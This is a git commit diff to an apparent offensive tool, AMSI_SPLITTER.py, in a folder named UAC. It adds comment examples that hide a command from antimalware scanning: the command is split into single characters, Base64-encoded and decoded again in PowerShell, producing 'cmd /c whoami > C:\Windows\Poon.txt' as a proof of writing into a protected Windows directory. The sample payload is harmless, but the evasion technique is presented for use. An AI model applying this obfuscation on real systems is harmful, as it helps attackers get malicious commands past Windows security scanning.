f0d21b424ebefce5c2b39cdef6338bec7cd1c7a8
p4yl0ad <57832389+p4yl0ad@users.noreply.github.com>
2021-04-06 13:38:10 +0100

    Update AMSI_SPLITTER.py

--- UAC/AMSI_SPLITTER.py
+++ UAC/AMSI_SPLITTER.py
@@ -14,3 +14,10 @@ class loop(Cmd):
         print(payload)
 
 loop().cmdloop()
+
+
+#EXAMPLE
+# [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("c"+"m"+"d"+" "+"/"+"c"+" "+"w"+"h"+"o"+"a"+"m"+"i"+" "+">"+" "+"C"+":"+"\"+"W"+"i"+"n"+"d"+"o"+"w"+"s"+"\"+"P"+"o"+"o"+"n"+"."+"t"+"x"+"t"))
+# $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBtAGQAIAAvAGMAIAB3AGgAbwBhAG0AaQAgAD4AIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUABvAG8AbgAuAHQAeAB0AA==')))
+# cmd /c whoami > C:\Windows\Poon.txt
+# ;)
